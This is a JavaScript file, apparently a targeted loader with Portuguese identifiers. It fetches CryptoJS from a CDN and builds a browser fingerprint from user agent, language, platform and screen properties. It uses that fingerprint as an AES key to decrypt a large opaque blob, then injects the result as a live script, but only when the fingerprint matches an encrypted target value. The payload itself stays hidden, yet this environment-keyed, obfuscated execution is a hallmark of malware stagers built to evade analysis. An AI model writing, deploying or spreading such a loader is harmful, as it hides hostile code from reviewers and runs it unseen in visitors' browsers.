
(function() {
    function loadCryptoJS(callback) {
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js';
        script.onload = callback;
        document.head.appendChild(script);
    }

    function decrypt(text, key) {
        try {
            const bytes = CryptoJS.AES.decrypt(text, key);
            return bytes.toString(CryptoJS.enc.Utf8);
        } catch (e) {
            console.error('Error decrypting:', e);
            return '';
        }
    }

    function gerarFingerprint() {
        const navigatorData = window.navigator;
        const fingerprint = [
            navigatorData.userAgent,
            navigatorData.language,
            navigatorData.platform,
            `${window.screen.width}x${window.screen.height}`,
            window.screen.colorDepth
        ].join('|');
        return fingerprint;
    }

    const encryptedCode = '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';
    const encryptedFingerprint = 'U2FsdGVkX19R0L4boHbOLSb/JvvxkGjSAG3eMn4s0UlmHk5is9ifRQoDFQ0XJggtUhlAJ4Z5kvHqqUANTlDcBIiImNtjikdOwO/eYohfS2mHp331Pnp9nplkKzY9xYnm9nJQ+YrAjU7TPMaCUdZKF8W18TWGumT2JSpkRzCWHVbS+EbnhulLADVhIwfFZWnnMitduafgU83T/hvDjj4rM4j8es5Op2MSTnbXjmjVWRfbo1av5bdQlSPs0Yr4SPHI';
    const key = gerarFingerprint();

    loadCryptoJS(function() {
        const decryptedFingerprint = decrypt(encryptedFingerprint, key);
        if (gerarFingerprint() === decryptedFingerprint) {
            const decryptedCode = decrypt(encryptedCode, key);
            try {
                const scriptElement = document.createElement('script');
                scriptElement.textContent = decryptedCode;
                document.body.appendChild(scriptElement);
            } catch (e) {
                console.error('Error executing code:', e);
            }
        } else {
            console.error('Fingerprint does not match.');
        }
    });
})();
        
